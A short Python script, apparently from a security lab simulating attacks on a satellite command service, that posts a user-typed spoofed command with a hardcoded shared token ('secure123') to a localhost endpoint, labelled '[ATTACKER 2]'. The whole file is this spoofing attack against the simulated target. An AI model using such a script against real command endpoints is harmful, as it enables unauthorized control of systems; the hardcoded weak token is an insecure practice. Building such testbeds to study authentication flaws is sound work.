import requests

SATELLITE_URL = "http://127.0.0.1:5001/receive-command"
AUTH_TOKEN = "secure123"  # Same token used in config.py

def spoof_command():
    print("[ATTACKER 2] Attempting authenticated spoofing...")
    fake_command = input("Enter spoofed command to send to satellite: ")
    try:
        response = requests.post(SATELLITE_URL, json={
            "command": fake_command,
            "auth_token": AUTH_TOKEN
        })
        print(f"Status Code: {response.status_code}")
        print("Response:", response.json())
    except Exception as e:
        print("[ERROR] Could not reach satellite:", e)

if __name__ == "__main__":
    spoof_command()
